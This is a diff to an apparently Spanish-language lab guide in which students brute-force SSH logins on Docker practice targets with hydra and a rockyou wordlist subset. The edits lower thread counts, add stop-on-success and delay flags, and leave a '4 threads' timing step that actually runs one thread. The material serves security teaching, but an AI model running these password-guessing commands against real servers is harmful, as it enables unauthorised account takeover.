@@ -111,15 +111,17 @@ dvwa:80            → Múltiples usuarios con passwords débiles
 # Verificar conectividad
 nc -zv ssh-target 2222
 
-# Ataque básico con usuario conocido
-hydra -l testuser -P /wordlists/rockyou-subset.txt ssh://ssh-target:2222 -t 4
+# Ataque básico con usuario conocido (1 thread para evitar errores de conexión)
+hydra -l testuser -P /wordlists/rockyou-subset.txt ssh://ssh-target:2222 -t 1 -f
 
 # Más verboso
-hydra -l testuser -P /wordlists/rockyou-subset.txt ssh://ssh-target:2222 -t 4 -vV
-
-# Parar al encontrar
-hydra -l testuser -P /wordlists/rockyou-subset.txt ssh://ssh-target:2222 -t 4 -f
+hydra -l testuser -P /wordlists/rockyou-subset.txt ssh://ssh-target:2222 -t 1 -vV -f
 ```
+
+> [!TIP]
+> **¿Errores de conexión?** El servidor SSH de Docker limita conexiones concurrentes.
+> - Usa `-t 1` (un solo thread) en lugar de `-t 4`
+> - Si persisten errores, añade `-W 1` para esperar 1 segundo entre intentos
 
 **Pregunta**: ¿Cuánto tardó en encontrar la contraseña?
 
@@ -203,7 +205,7 @@ demo
 EOF
 
 # Ataque con múltiples usuarios
-hydra -L /tmp/users.txt -P /wordlists/rockyou-subset.txt ssh://ssh-target:2222 -t 4
+hydra -L /tmp/users.txt -P /wordlists/rockyou-subset.txt ssh://ssh-target:2222 -t 1 -f
 ```
 
 
@@ -405,7 +407,7 @@ Google reCAPTCHA previene ataques automáticos:
 time hydra -l testuser -P /wordlists/rockyou-subset.txt ssh://ssh-target:2222 -t 1
 
 # 4 threads
-time hydra -l testuser -P /wordlists/rockyou-subset.txt ssh://ssh-target:2222 -t 4
+time hydra -l testuser -P /wordlists/rockyou-subset.txt ssh://ssh-target:2222 -t 1 -f
 
 # 16 threads (puede ser contraproducente)
 time hydra -l testuser -P /wordlists/rockyou-subset.txt ssh://ssh-target:2222 -t 16
